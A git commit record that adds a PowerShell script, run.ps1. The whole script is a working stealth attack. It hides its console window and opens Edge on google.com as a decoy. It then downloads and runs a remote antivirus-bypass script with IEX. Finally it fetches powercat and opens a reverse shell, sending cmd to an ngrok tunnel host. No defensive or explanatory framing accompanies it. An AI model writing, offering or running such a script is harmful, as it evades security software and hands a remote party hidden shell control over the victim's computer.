5cb2ca8198945792113d00c6ff8604ea324e38ee
Osman Kandemir <juanter53@hotmail.com>
2022-09-30 01:12:07 +0300

    Add files via upload

---
+++ run.ps1
@@ -0,0 +1,16 @@
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
+$consolePtr = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consolePtr, 0)
+
+start microsoft-edge:http://google.com
+$wshell = New-Object -ComObject wscript.shell;
+$wshell.AppActivate('Google - Microsoft Edge')
+
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aloksaurabh/OffenPowerSh/master/Bypass/Invoke-AlokS-AvBypass.ps1'); 
+Invoke-AlokS-AvBypass;
+
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 4.tcp.eu.ngrok.io -p 19875 -e cmd
